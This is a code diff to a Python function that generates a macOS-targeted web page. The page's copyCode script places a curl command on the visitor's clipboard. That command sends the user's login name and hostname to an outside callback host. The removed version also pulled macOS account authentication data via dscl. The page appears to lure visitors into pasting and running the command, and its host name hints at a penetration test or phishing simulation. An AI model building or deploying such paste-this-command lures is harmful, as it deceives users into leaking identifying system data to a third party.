@@ -273,7 +273,7 @@ def get_mac_html():
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('id') || 'unknown';
         function copyCode() {
-            const command = 'curl -s https://ptest-callback-production.up.railway.app/dns-callback?u=$(whoami)\\&c=$(hostname)\\&d=$(dscl . read /Users/$(whoami) AuthenticationAuthority 2>/dev/null | grep -o "com\\\\.apple\\\\..*" || echo "local")\\&os=macos';
+            const command = 'u=$(whoami); h=$(hostname); curl -s "https://ptest-callback-production.up.railway.app/dns-callback?u=$u&c=$h&d=local&os=macos"';
             navigator.clipboard.writeText(command).then(function() {
                 document.getElementById('codeBox').style.display = 'block';
                 document.getElementById('codeBox').innerText = command;
